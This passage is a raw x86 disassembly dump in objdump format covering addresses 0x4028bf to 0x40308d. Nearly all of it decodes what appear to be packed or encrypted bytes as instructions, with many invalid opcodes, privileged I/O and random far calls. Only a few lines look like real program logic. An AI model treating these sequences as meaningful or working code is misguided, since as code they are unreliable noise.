  4028bf:	mul    BYTE PTR [ebx+0x26]
  4028c2:	das    
  4028c3:	in     al,dx
  4028c4:	std    
  4028c5:	xor    eax,0xd3ccf5c7
  4028ca:	fdivrp st(3),st
  4028cc:	adc    bh,bh
  4028ce:	pop    ss
  4028cf:	(bad)  
  4028d0:	imul   esp,DWORD PTR [esi+0x5e],0x3eb57d4e
  4028d7:	cmp    DWORD PTR [eax],edx
  4028d9:	add    BYTE PTR [edi-0x5e408da4],dl
  4028df:	dec    eax
  4028e0:	mov    ds:0xacff1617,eax
  4028e5:	add    al,0x5d
  4028e7:	mov    ch,0x5d
  4028e9:	sub    cl,bh
  4028eb:	sub    BYTE PTR [ebx-0x2eee8dcf],dh
  4028f1:	xchg   BYTE PTR [esi+edi*1+0xbdefd33],al
  4028f8:	adc    eax,0xc7f04927
  4028fd:	std    
  4028fe:	les    ebp,FWORD PTR [esi+ebx*2+0x2d1e3b7b]
  402905:	and    al,0x28
  402907:	sbb    dl,0x8
  40290a:	in     al,dx
  40290b:	rcl    esi,cl
  40290d:	(bad)  
  40290e:	push   esp
  40290f:	sbb    DWORD PTR [eax+0x20a16500],ebp
  402915:	not    al
  402917:	mul    DWORD PTR [ebx-0x3b4aef04]
  40291d:	mov    bl,0x16
  40291f:	cli    
  402920:	mov    cl,0x38
  402922:	sar    BYTE PTR [esi],cl
  402924:	cmp    eax,0xba74df68
  402929:	call   0x574a92ac
  40292e:	mov    ch,0xa9
  402930:	(bad)  
  402931:	mov    cs,WORD PTR ds:0x29a1
  402936:	jne    0x4029b5
  402938:	xchg   ebx,eax
  402939:	sbb    DWORD PTR [eax],ebx
  40293b:	sub    DWORD PTR [ebx-0x5f],edx
  40293e:	aas    
  40293f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402940:	mov    bh,0xd0
  402942:	enter  0x1976,0xb3
  402946:	pop    ebp
  402947:	pusha  
  402948:	adc    DWORD PTR [edi+0x526ecb61],edi
  40294e:	mov    ds:0xc772df70,al
  402953:	data16 int 0xfb
  402956:	pusha  
  402957:	(bad)  
  402958:	cld    
  402959:	test   eax,0x2e5c8ae9
  40295e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40295f:	ja     0x4029da
  402961:	fst    QWORD PTR [ebp-0x2c]
  402964:	mov    edx,0xcd3299a8
  402969:	nop
  40296a:	pusha  
  40296b:	push   ds
  40296c:	jp     0x402997
  40296e:	xchg   esp,eax
  40296f:	pop    ebx
  402970:	sbb    ebp,ebp
  402972:	stc    
  402973:	addr16 cwde 
  402975:	lds    esi,FWORD PTR [edi-0x28c647ca]
  40297b:	cmp    eax,0x922597f5
  402980:	fist   DWORD PTR [ecx]
  402982:	xchg   BYTE PTR [esi-0x4a8e504c],bl
  402988:	add    BYTE PTR [edi+eiz*1],al
  40298b:	in     al,0xf6
  40298d:	fwait
  40298e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40298f:	adc    al,BYTE PTR [esp+eax*1]
  402992:	cmp    BYTE PTR [edi-0x68522f08],bl
  402998:	(bad)  
  402999:	cdq    
  40299a:	pop    edi
  40299b:	add    al,0x17
  40299d:	sub    eax,0xa26389cb
  4029a2:	xor    dx,0xffab
  4029a6:	push   es
  4029a7:	in     eax,dx
  4029a8:	retf   
  4029a9:	fistp  DWORD PTR [ebx+0xa19736f]
  4029af:	jns    0x402a08
  4029b1:	jb     0x4029c9
  4029b3:	jbe    0x4029d0
  4029b5:	sub    al,0xd6
  4029b7:	adc    BYTE PTR [edx-0xd],dh
  4029ba:	add    DWORD PTR [eax+ebx*8-0x5f79013a],eax
  4029c1:	inc    esp
  4029c2:	mov    ebx,0xc3bc9856
  4029c7:	jo     0x4029e5
  4029c9:	pop    eax
  4029ca:	mov    dl,0x0
  4029cc:	loop   0x402980
  4029ce:	pop    edx
  4029cf:	pop    es
  4029d0:	fimul  DWORD PTR [ecx]
  4029d2:	stc    
  4029d3:	jmp    0x402975
  4029d5:	nop
  4029d6:	shl    DWORD PTR [eax+ebp*4],0x1
  4029da:	add    DWORD PTR [ecx-0x3e2977fd],0xffffff90
  4029e1:	out    dx,eax
  4029e2:	ins    DWORD PTR es:[edi],dx
  4029e3:	mov    ecx,edx
  4029e5:	and    BYTE PTR [esi],al
  4029e7:	(bad)  
  4029ea:	cmp    BYTE PTR [ebx],0x46
  4029ed:	and    dl,BYTE PTR [edx+0x22]
  4029f0:	xchg   edx,eax
  4029f1:	adc    al,BYTE PTR [edi]
  4029f3:	xchg   ebx,eax
  4029f4:	shl    BYTE PTR [edx],0xe7
  4029f7:	stc    
  4029f8:	enter  0xb8ce,0xe6
  4029fc:	xchg   ebx,eax
  4029fd:	int3   
  4029fe:	rcl    al,cl
  402a00:	mov    eax,ds:0x9291c7e8
  402a05:	aad    0xd9
  402a07:	bound  edx,QWORD PTR [edx]
  402a09:	xchg   edi,eax
  402a0a:	mov    eax,0x4830fa52
  402a0f:	scas   al,BYTE PTR es:[edi]
  402a10:	es in  al,0x9c
  402a13:	add    ebx,DWORD PTR [ecx+0x65de08dc]
  402a19:	mov    WORD PTR [edi+eiz*4+0x35],fs
  402a1d:	sub    eax,0xa53ec45d
  402a22:	stos   DWORD PTR es:[edi],eax
  402a23:	xor    ebx,DWORD PTR [esi-0x55]
  402a26:	pusha  
  402a27:	fs pop esp
  402a29:	retf   0xf931
  402a2c:	jno    0x402a95
  402a2e:	stos   BYTE PTR es:[edi],al
  402a2f:	push   0xffffff86
  402a31:	lds    eax,FWORD PTR [ebp-0x77]
  402a34:	push   edx
  402a35:	aad    0xc1
  402a37:	dec    edx
  402a38:	xor    BYTE PTR [edi-0xe],cl
  402a3b:	ja     0x4029f0
  402a3d:	push   eax
  402a3e:	ss (bad) 
  402a40:	out    dx,al
  402a41:	(bad)  
  402a42:	mov    dl,0xce
  402a44:	pop    eax
  402a45:	jns    0x402a68
  402a47:	popa   
  402a48:	ja     0x402a87
  402a4a:	push   ss
  402a4b:	pop    edx
  402a4c:	das    
  402a4d:	jge    0x402a8c
  402a4f:	fsub   QWORD PTR [ebp-0x16]
  402a52:	cmp    BYTE PTR [esi+0x7c2605d4],0xa0
  402a59:	sbb    esp,DWORD PTR [edx-0x71]
  402a5c:	es push ecx
  402a5e:	mov    eax,0xef2506e4
  402a63:	add    BYTE PTR [eax+0xb4208d],ch
  402a69:	int3   
  402a6a:	jle    0x402ad7
  402a6c:	cmp    DWORD PTR [ecx+0x1a4301f4],esp
  402a72:	hlt    
  402a73:	push   ecx
  402a74:	(bad)  [ebx+eiz*1]
  402a77:	aaa    
  402a78:	fwait
  402a79:	mov    ?,ebx
  402a7b:	dec    edi
  402a7c:	or     eax,0x147fcad6
  402a81:	jne    0x402a63
  402a83:	xchg   eax,eax
  402a85:	xor    DWORD PTR [edi+0x6d],ecx
  402a88:	sbb    DWORD PTR [esi-0x1b],0x1cc311cb
  402a8f:	sbb    BYTE PTR ds:[edx],bl
  402a92:	sbb    ebx,DWORD PTR [edx]
  402a94:	fldcw  WORD PTR ds:0x8887bedc
  402a9a:	inc    ecx
  402a9b:	adc    eax,DWORD PTR ds:0x334f5d2b
  402aa1:	sub    eax,0x3826e583
  402aa6:	pop    ds
  402aa7:	scas   eax,DWORD PTR es:[edi]
  402aa8:	xchg   DWORD PTR [eax+0x7b4e13cf],edx
  402aae:	pop    ecx
  402aaf:	xor    al,0x7b
  402ab1:	xchg   edi,eax
  402ab2:	cmp    DWORD PTR [esi],esp
  402ab4:	inc    ebx
  402ab5:	jecxz  0x402a52
  402ab7:	pop    ebx
  402ab8:	rcl    DWORD PTR [ecx-0x33],0x8
  402abc:	mov    ds:0xbc6e1091,eax
  402ac1:	inc    esi
  402ac2:	test   eax,0x8e4fe2e9
  402ac7:	add    bh,al
  402ac9:	mov    dh,0x6e
  402acb:	enter  0x4c7e,0x11
  402acf:	leave  
  402ad0:	push   ss
  402ad1:	gs pusha 
  402ad3:	imul   edx,DWORD PTR [edx+0x6b7e0a7c],0xafe4395
  402add:	mov    esp,0x42ae59c4
  402ae2:	shr    ah,0xb5
  402ae5:	or     al,0x44
  402ae7:	sub    edi,DWORD PTR [eax+0x1c]
  402aea:	mov    bh,0x81
  402aec:	pop    ss
  402aed:	stc    
  402aee:	adc    BYTE PTR [edi-0x2],dh
  402af1:	pop    edx
  402af2:	dec    ebp
  402af3:	ret    
  402af4:	pop    ds
  402af5:	mov    ds:0xce93701,al
  402afa:	inc    esi
  402afb:	add    al,BYTE PTR [ecx-0x4052c213]
  402b01:	pop    es
  402b02:	je     0x402b78
  402b04:	jmp    0x402a8c
  402b06:	jl     0x402b1a
  402b08:	not    DWORD PTR ds:0xb2a11649
  402b0e:	fldcw  WORD PTR [ebx]
  402b10:	enter  0x9ae9,0x2
  402b14:	add    BYTE PTR [eax],al
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	sub    BYTE PTR [edx+0x128e3f3b],ch
  402b28:	js     0x402ba2
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402b0b
  402b2f:	sbb    eax,0x968b27
  402b34:	jl     0x402b30
  402b36:	leave  
  402b37:	mov    ebp,0x744dd365
  402b3c:	mov    ds:0xd28f9b79,eax
  402b41:	mov    DWORD PTR [esi+0x3805aa4e],ebp
  402b47:	aas    
  402b48:	mov    cl,0xc8
  402b4a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b4c:	and    DWORD PTR [eax+0x4e15f3c6],0x5cf52ae8
  402b56:	mov    ss,WORD PTR [ebp-0x7c]
  402b59:	inc    ecx
  402b5a:	mov    edi,0x4efdb165
  402b5f:	rcl    BYTE PTR [esi],cl
  402b61:	jecxz  0x402ae6
  402b63:	push   0x22
  402b65:	int    0x86
  402b67:	mov    al,0x50
  402b69:	adc    BYTE PTR [esi],0xd8
  402b6c:	mov    dh,0x9b
  402b6e:	jo     0x402bbc
  402b70:	push   esi
  402b71:	cmp    BYTE PTR [edi],ah
  402b73:	push   ebp
  402b74:	test   DWORD PTR [ecx+0x660275fd],esi
  402b7a:	(bad)  
  402b7b:	enter  0xf1ca,0x2a
  402b7f:	add    edi,DWORD PTR [eax]
  402b81:	imul   edx,DWORD PTR [ebx-0x4c],0x234d605c
  402b88:	shl    DWORD PTR [edi+0x7a],1
  402b8b:	sbb    al,0xfa
  402b8d:	adc    eax,0x6cf0468f
  402b92:	dec    ebx
  402b93:	dec    ebp
  402b94:	(bad)  
  402b95:	cmp    DWORD PTR [ecx+0x78bb47cc],esi
  402b9b:	aas    
  402b9c:	mov    esi,DWORD PTR [esi-0x4aaa2aaa]
  402ba2:	stos   BYTE PTR es:[edi],al
  402ba3:	and    dl,BYTE PTR [edx+0x9]
  402ba6:	push   ebp
  402ba7:	ja     0x402bbb
  402ba9:	ucomiss xmm3,DWORD PTR [ebx]
  402bac:	add    BYTE PTR [esi+0x4d602218],dl
  402bb2:	ins    BYTE PTR es:[edi],dx
  402bb3:	clc    
  402bb4:	push   es
  402bb5:	loop   0x402c06
  402bb7:	js     0x402bab
  402bb9:	xchg   esp,eax
  402bba:	cmp    DWORD PTR [edi-0x57a99c7b],esi
  402bc0:	pop    eax
  402bc1:	push   esi
  402bc2:	stos   DWORD PTR es:[edi],eax
  402bc3:	jae    0x402b49
  402bc5:	and    al,0x8e
  402bc7:	out    dx,eax
  402bc8:	push   ecx
  402bc9:	out    dx,al
  402bca:	mov    ebx,0xec0e4496
  402bcf:	lea    esi,[ebp+esi*1+0x61]
  402bd3:	or     ebp,0x80b33460
  402bd9:	inc    edi
  402bda:	icebp  
  402bdb:	into   
  402bdc:	jge    0x402bc7
  402bde:	lock dec edx
  402be0:	or     eax,0x3b08e0c5
  402be5:	jmp    0x402bd0
  402be7:	popa   
  402be8:	pop    es
  402be9:	sbb    al,0xdb
  402beb:	cld    
  402bec:	(bad)  
  402bee:	(bad)  
  402bef:	and    BYTE PTR [esp+ecx*4+0x43],cl
  402bf3:	cdq    
  402bf4:	outs   dx,BYTE PTR ds:[esi]
  402bf5:	pusha  
  402bf6:	in     al,dx
  402bf7:	mov    dh,0x9f
  402bf9:	(bad)  
  402bfa:	test   edi,0x89113564
  402c00:	and    BYTE PTR [edx+0x21],0x87
  402c04:	lahf   
  402c05:	and    BYTE PTR [ecx+0x17],dh
  402c08:	sbb    al,0xb1
  402c0a:	sahf   
  402c0b:	sbb    ecx,DWORD PTR [ebp+0x5e5b6a49]
  402c11:	mov    esp,0xddb29c00
  402c16:	shl    DWORD PTR [ecx],0x69
  402c19:	mul    BYTE PTR [esp+edx*1-0x61766800]
  402c20:	dec    eax
  402c21:	ins    BYTE PTR es:[edi],dx
  402c22:	push   eax
  402c23:	push   edi
  402c24:	xor    eax,0x36b4d315
  402c29:	aaa    
  402c2a:	add    DWORD PTR es:[ecx],eax
  402c2d:	xlat   BYTE PTR ds:[ebx]
  402c2e:	cmp    al,0x4f
  402c30:	imul   esi,DWORD PTR [ebx-0x31],0x9643665e
  402c37:	lahf   
  402c38:	data16 jbe 0x402c05
  402c3b:	mov    dl,0x2d
  402c3d:	pop    eax
  402c3e:	jnp    0x402caa
  402c40:	push   esi
  402c41:	xor    al,0x99
  402c43:	nop
  402c44:	stos   DWORD PTR es:[edi],eax
  402c45:	mov    al,ds:0x228a7599
  402c4a:	test   BYTE PTR [ecx+ebx*4-0x1bcee080],0x3
  402c52:	xor    DWORD PTR [esp+ebx*2],ebp
  402c55:	imul   ebx,edi,0xf
  402c58:	mov    ebx,DWORD PTR [eax+ecx*1-0x31]
  402c5c:	xor    ch,cl
  402c5e:	push   ss
  402c5f:	fistp  QWORD PTR [edi+0x2a]
  402c62:	iret   
  402c63:	cmp    ch,ah
  402c65:	push   ss
  402c66:	fbld   TBYTE PTR [ecx+0x1]
  402c69:	arpl   WORD PTR [edi],cx
  402c6b:	sahf   
  402c6c:	xor    ebx,eax
  402c6e:	mov    cl,0xc
  402c70:	gs shl ecx,0x68
  402c74:	out    dx,al
  402c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c76:	call   0x84a8e1b
  402c7b:	mov    BYTE PTR [eax],cl
  402c7d:	push   edx
  402c7e:	shl    DWORD PTR [ebp-0x53],cl
  402c81:	scas   al,BYTE PTR es:[edi]
  402c82:	fucomi st,st(3)
  402c84:	adc    DWORD PTR [ecx-0x137c4d02],ecx
  402c8a:	pop    eax
  402c8b:	pop    ss
  402c8c:	popf   
  402c8d:	div    BYTE PTR [ebp-0x7d2c9a7]
  402c93:	lea    ebp,[ecx]
  402c95:	mov    esp,0x3a8b7faa
  402c9a:	mov    cl,0xed
  402c9c:	imul   edi,DWORD PTR ss:[edx-0x1149f373],0x7b
  402ca4:	inc    esp
  402ca5:	leave  
  402ca6:	mov    esp,0x6f17d77d
  402cab:	scas   eax,DWORD PTR es:[edi]
  402cac:	sti    
  402cad:	push   edi
  402cae:	call   0x835ca1db
  402cb3:	and    dh,BYTE PTR [eax-0x5205216]
  402cb9:	adc    ebp,DWORD PTR ds:0xde6ac2d2
  402cbf:	sbb    DWORD PTR [esi-0x4959b2c3],edi
  402cc5:	push   ebx
  402cc6:	fstp   st(3)
  402cc8:	ror    BYTE PTR [esi],cl
  402cca:	in     al,0x5
  402ccc:	inc    esi
  402ccd:	xor    al,0x2e
  402ccf:	push   ebp
  402cd0:	ret    0x4a77
  402cd3:	clc    
  402cd4:	add    BYTE PTR ds:0x3c64a4fb,dl
  402cda:	(bad)  
  402cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cdc:	sbb    BYTE PTR [ebp-0x1c4b150],dl
  402ce2:	inc    eax
  402ce3:	shr    BYTE PTR [ecx-0x28],0xae
  402ce7:	aaa    
  402ce8:	xor    al,0xa3
  402cea:	nop
  402ceb:	(bad)  
  402cec:	int3   
  402ced:	jl     0x402d65
  402cef:	xchg   esp,eax
  402cf0:	xor    cl,ah
  402cf2:	fdivr  st(5),st
  402cf4:	pop    eax
  402cf5:	push   cs
  402cf6:	or     edx,DWORD PTR [edx]
  402cf8:	pushf  
  402cf9:	shl    DWORD PTR [ecx-0x21],1
  402cfc:	add    eax,0x4bb0f72d
  402d01:	inc    ecx
  402d02:	sbb    DWORD PTR [ecx],ecx
  402d04:	les    esi,FWORD PTR [edi+0x6e44e03]
  402d0a:	outs   dx,BYTE PTR ds:[esi]
  402d0b:	or     edx,edx
  402d0d:	sti    
  402d0e:	and    ah,bl
  402d10:	test   eax,0xe461104a
  402d15:	out    0xdc,eax
  402d17:	in     al,0x6
  402d19:	in     al,0xb0
  402d1b:	xchg   BYTE PTR [edi],dl
  402d1d:	dec    edi
  402d1e:	adc    eax,0xcb02296f
  402d23:	mov    eax,0x517f3e4f
  402d28:	mov    ebp,0xa18be80b
  402d2d:	pop    eax
  402d2e:	fisubr WORD PTR [edx]
  402d30:	test   DWORD PTR [ebx-0x61],edx
  402d33:	cmp    BYTE PTR [bp-0x2a90],dl
  402d38:	int3   
  402d39:	jmp    0x402cec
  402d3b:	imul   edx,DWORD PTR [edi],0xffffff84
  402d3e:	lods   al,BYTE PTR ds:[esi]
  402d3f:	push   es
  402d40:	ds push ds
  402d42:	sub    al,0x15
  402d44:	aad    0x29
  402d46:	cdq    
  402d47:	cld    
  402d48:	adc    al,0x66
  402d4a:	es pop ebx
  402d4c:	and    bh,cl
  402d4e:	cmc    
  402d4f:	js     0x402db3
  402d51:	nop
  402d52:	aas    
  402d53:	pop    edx
  402d54:	outs   dx,DWORD PTR ds:[esi]
  402d55:	jmp    0x171b427c
  402d5a:	lock mov edi,0x3d6161bf
  402d60:	adc    eax,0xd33d9ec9
  402d65:	push   esi
  402d66:	call   0x1ccb:0x98e1f67e
  402d6d:	scas   al,BYTE PTR es:[edi]
  402d6e:	push   esi
  402d6f:	inc    esp
  402d70:	cli    
  402d71:	ins    DWORD PTR es:[edi],dx
  402d72:	out    0x92,al
  402d74:	sbb    eax,0x43ea352
  402d79:	js     0x402d50
  402d7b:	mov    esp,0x3087abf9
  402d80:	imul   ebx,edx,0x92bbc0ee
  402d86:	call   0x1c72:0x1f164169
  402d8d:	cmp    BYTE PTR [edi],dl
  402d8f:	mov    ebp,0x498c71b4
  402d94:	js     0x402d73
  402d96:	test   eax,0x21de96b2
  402d9b:	adc    DWORD PTR [eax+0xf],0xe062c43c
  402da2:	cdq    
  402da3:	les    esp,FWORD PTR [edx]
  402da5:	jg     0x402d6d
  402da7:	loope  0x402dc6
  402da9:	sti    
  402daa:	iret   
  402dab:	outs   dx,BYTE PTR ds:[esi]
  402dac:	(bad)  
  402dad:	div    BYTE PTR [edi+0x5d]
  402db0:	sub    ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	sub    esp,edx
  402df4:	js     0x402d8f
  402df6:	or     al,0x17
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e60
  402dff:	loope  0x402ddb
  402e01:	jecxz  0x402dde
  402e03:	rcl    ah,cl
  402e05:	std    
  402e06:	sub    ch,al
  402e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e09:	in     al,dx
  402e0a:	mov    BYTE PTR [edi-0x31],bh
  402e0d:	call   0x8519:0xafeb657d
  402e14:	lea    ebx,[ebp-0x2b]
  402e17:	xor    bh,bl
  402e19:	cld    
  402e1a:	and    BYTE PTR [eax-0x5249a4b9],0x8d
  402e21:	ror    BYTE PTR [eax],cl
  402e23:	outs   dx,DWORD PTR ds:[esi]
  402e24:	mov    eax,0x4771c418
  402e29:	lea    esp,[edi]
  402e2b:	out    dx,al
  402e2c:	imul   edi,DWORD PTR [ebp-0x3c],0xf4d9e58d
  402e33:	stos   DWORD PTR es:[edi],eax
  402e34:	mov    cl,0xeb
  402e36:	hlt    
  402e37:	lahf   
  402e38:	sub    DWORD PTR [ebp+0x24],0xb5a7dba2
  402e3f:	shr    DWORD PTR [esp+ebp*2+0x35fffdd9],cl
  402e46:	or     al,0x5c
  402e48:	mov    al,ds:0x429d62b5
  402e4d:	or     esp,DWORD PTR [ebx-0x2]
  402e50:	and    eax,0x950d3255
  402e55:	ficomp WORD PTR [eax+0x76]
  402e58:	call   0x61dbd43
  402e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e5e:	das    
  402e5f:	cli    
  402e60:	nop
  402e61:	pop    es
  402e62:	and    DWORD PTR [edi-0x3],eax
  402e65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e66:	fs dec eax
  402e68:	jb     0x402e03
  402e6a:	mov    esi,0xbbbc3a21
  402e6f:	test   al,0xb6
  402e71:	push   ds
  402e72:	loope  0x402e07
  402e74:	mov    cl,0x3c
  402e76:	xor    DWORD PTR [esi+esi*1+0x644b9b42],esi
  402e7d:	in     al,0x8c
  402e7f:	or     edi,DWORD PTR ds:0x5d7fc72
  402e85:	sub    al,0xe7
  402e87:	ss mov cl,0x1f
  402e8a:	fist   WORD PTR [ebx+0x40]
  402e8d:	pop    ebx
  402e8e:	pop    edx
  402e8f:	ins    DWORD PTR es:[edi],dx
  402e90:	retf   
  402e91:	mov    edi,0x6e974d8b
  402e96:	mov    BYTE PTR [ebx-0x24fa30b2],cl
  402e9c:	lahf   
  402e9d:	mov    ch,0x5e
  402e9f:	test   al,0x41
  402ea1:	mov    eax,ds:0x8701c32c
  402ea6:	es xchg esi,eax
  402ea8:	xchg   edx,eax
  402ea9:	ss (bad) 
  402eab:	loop   0x402e6a
  402ead:	fxch   st(4)
  402eaf:	cmc    
  402eb0:	xchg   esp,eax
  402eb1:	popf   
  402eb2:	bound  eax,QWORD PTR [eax+0x2c361b9a]
  402eb8:	(bad)  
  402eb9:	inc    esi
  402eba:	xor    dh,BYTE PTR [eax-0x27971109]
  402ec0:	add    edi,DWORD PTR [edi+0xbb8d86]
  402ec6:	cmp    DWORD PTR [esi],ecx
  402ec8:	adc    BYTE PTR ds:0x9cc279e3,dl
  402ece:	in     eax,0x2b
  402ed0:	mov    eax,0x34cca108
  402ed5:	ins    BYTE PTR es:[edi],dx
  402ed6:	sub    BYTE PTR [edx+0x7b5cabb9],al
  402edc:	arpl   WORD PTR [edi+0x7af6b65],ax
  402ee2:	cmc    
  402ee3:	ins    DWORD PTR es:[edi],dx
  402ee4:	xor    BYTE PTR [edx],cl
  402ee6:	test   BYTE PTR [ecx+eax*8+0x25c33ccb],bl
  402eed:	rcr    BYTE PTR [eax+0x3a],1
  402ef0:	push   0xffffffe0
  402ef2:	aaa    
  402ef3:	mov    cl,0xf8
  402ef5:	les    edi,FWORD PTR [edi+0x5e]
  402ef8:	pop    ebp
  402ef9:	jecxz  0x402f77
  402efb:	push   esi
  402efc:	or     dl,BYTE PTR [esi-0xd]
  402eff:	fsubr  QWORD PTR [ebp-0x446f3342]
  402f05:	sahf   
  402f06:	pop    DWORD PTR [edx+0x7e244feb]
  402f0c:	push   0xd156f17d
  402f11:	mov    dl,0x59
  402f13:	mov    gs,WORD PTR [ebp-0x75]
  402f16:	or     ecx,ebp
  402f18:	xchg   ebp,eax
  402f19:	mov    ch,0x3f
  402f1b:	(bad)  
  402f1c:	iret   
  402f1d:	pop    ebp
  402f1e:	aad    0x61
  402f20:	xchg   ebx,eax
  402f21:	in     al,dx
  402f22:	rol    dh,cl
  402f24:	neg    BYTE PTR [edx+0x8]
  402f27:	imul   eax,DWORD PTR ds:0x5ce92066,0x71ca93da
  402f31:	cli    
  402f32:	call   0x5b4ff85a
  402f37:	sahf   
  402f38:	cmp    DWORD PTR [eax+0x11],esi
  402f3b:	mov    esp,DWORD PTR [ebx+edi*2+0x1b]
  402f3f:	pop    ebp
  402f40:	cmp    al,0xf0
  402f42:	int    0x5f
  402f44:	sub    DWORD PTR [esi+0x1783a996],edi
  402f4a:	push   edi
  402f4b:	add    al,0x54
  402f4d:	xor    DWORD PTR [edi+ebx*4],0xffffffca
  402f51:	rcr    DWORD PTR [edx+0x6a],0x22
  402f55:	mov    cl,0xf1
  402f57:	sbb    al,0x23
  402f59:	repnz xchg edx,eax
  402f5b:	and    dh,ah
  402f5d:	add    esp,ebp
  402f5f:	jl     0x402ee9
  402f61:	popa   
  402f62:	dec    ebp
  402f63:	in     al,0x21
  402f65:	sub    DWORD PTR [edx],esp
  402f67:	mov    fs,ecx
  402f69:	call   FWORD PTR [ebx+0x9]
  402f6c:	add    DWORD PTR [ecx+edx*1],0xffffff9e
  402f70:	ins    BYTE PTR es:[edi],dx
  402f71:	adc    al,BYTE PTR [eax+0x7c7931d5]
  402f77:	xchg   ecx,eax
  402f78:	mov    eax,ds:0x3ee484c5
  402f7d:	lock lea ebp,[esi-0x336849fd]
  402f84:	mov    edi,0x327aa6f1
  402f89:	pushf  
  402f8a:	sti    
  402f8b:	repnz sbb eax,0xf4292470
  402f91:	dec    edx
  402f92:	data16 (bad) 
  402f94:	sti    
  402f95:	jecxz  0x403010
  402f97:	sar    DWORD PTR [ecx-0x19b184b0],cl
  402f9d:	scas   al,BYTE PTR es:[edi]
  402f9e:	in     al,dx
  402f9f:	out    dx,al
  402fa0:	rcl    DWORD PTR [eax+eax*1],0xef
  402fa4:	sbb    al,0x73
  402fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fa7:	add    edx,0x47540cde
  402fad:	sahf   
  402fae:	scas   al,BYTE PTR es:[edi]
  402faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fb0:	mov    ds:0xeb067e4a,al
  402fb5:	outs   dx,BYTE PTR ds:[esi]
  402fb6:	adc    al,0x65
  402fb8:	ficomp WORD PTR [edi+ebx*1]
  402fbb:	xlat   BYTE PTR ds:[ebx]
  402fbc:	loopne 0x402fb2
  402fbe:	call   0x82d48ec7
  402fc3:	lds    ebx,FWORD PTR [edx]
  402fc5:	std    
  402fc6:	js     0x40300e
  402fc8:	icebp  
  402fc9:	dec    edi
  402fca:	je     0x402f78
  402fcc:	aam    0x35
  402fce:	xchg   edx,eax
  402fcf:	jecxz  0x403009
  402fd1:	aaa    
  402fd2:	lea    ebx,[ecx]
  402fd4:	cmp    DWORD PTR [ecx-0x21],ecx
  402fd7:	gs int 0xad
  402fda:	test   eax,0xce2aba22
  402fdf:	mov    esp,DWORD PTR [ecx]
  402fe1:	or     ch,BYTE PTR [ecx]
  402fe3:	iret   
  402fe4:	retf   0xa319
  402fe7:	(bad)  
  402fe8:	mov    edi,0xe1322419
  402fed:	cmp    DWORD PTR [edi-0x13],ecx
  402ff0:	mov    ecx,0x27642c90
  402ff5:	dec    edi
  402ff6:	fild   DWORD PTR [esi+0x441c4d18]
  402ffc:	sub    BYTE PTR [edi+0x62],ah
  402fff:	add    al,0xe1
  403001:	outs   dx,DWORD PTR ds:[esi]
  403002:	call   FWORD PTR [ecx-0x7f]
  403005:	in     eax,dx
  403006:	hlt    
  403007:	call   0x7a83:0x8b4d955a
  40300e:	cdq    
  40300f:	(bad)  [edx]
  403011:	imul   ecx,DWORD PTR [eax],0xffffffab
  403014:	xor    BYTE PTR [esp+eax*1],dl
  403017:	dec    ebx
  403018:	mov    ah,0x28
  40301a:	and    dl,ah
  40301c:	xchg   edi,eax
  40301d:	fcmovne st,st(6)
  40301f:	out    0x1b,eax
  403021:	xchg   ebp,eax
  403022:	je     0x403076
  403024:	in     eax,dx
  403025:	sbb    ecx,edi
  403027:	pop    ds
  403028:	call   0xffbc7bd2
  40302d:	mov    ?,WORD PTR [ebp-0x5c]
  403030:	push   0x12
  403032:	out    dx,al
  403033:	xchg   esi,eax
  403034:	pop    ss
  403035:	icebp  
  403036:	repz int 0x5f
  403039:	cmp    DWORD PTR [ecx+0x56],edi
  40303c:	xchg   ebx,eax
  40303d:	(bad)  
  40303e:	fdivr  st,st(5)
  403040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403041:	mov    cs,WORD PTR [eax+edx*1]
  403044:	dec    eax
  403046:	inc    BYTE PTR [ebp+ecx*2+0x47c4941a]
  40304d:	add    al,0xd6
  40304f:	outs   dx,BYTE PTR ds:[esi]
  403050:	imul   ebx,DWORD PTR [ebx-0x14],0xdfeeccb
  403057:	mov    bh,0x66
  403059:	int3   
  40305a:	dec    ebp
  40305b:	fmul   DWORD PTR [esi-0x21]
  40305e:	inc    esp
  40305f:	fadd   st(0),st
  403061:	jbe    0x403027
  403063:	xchg   edi,eax
  403064:	loop   0x4030bf
  403066:	fs xchg ecx,eax
  403068:	jge    0x40300a
  40306a:	cli    
  40306b:	jne    0x403002
  40306d:	(bad)  
  40306f:	jo     0x40301f
  403071:	sbb    ecx,DWORD PTR [edi+edi*2]
  403074:	inc    edx
  403075:	imul   esi,esi,0xce637868
  40307b:	push   ds
  40307c:	out    0x2f,al
  40307e:	sub    DWORD PTR ds:0x8b08458b,ebp
  403084:	dec    ebp
  403085:	clc    
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
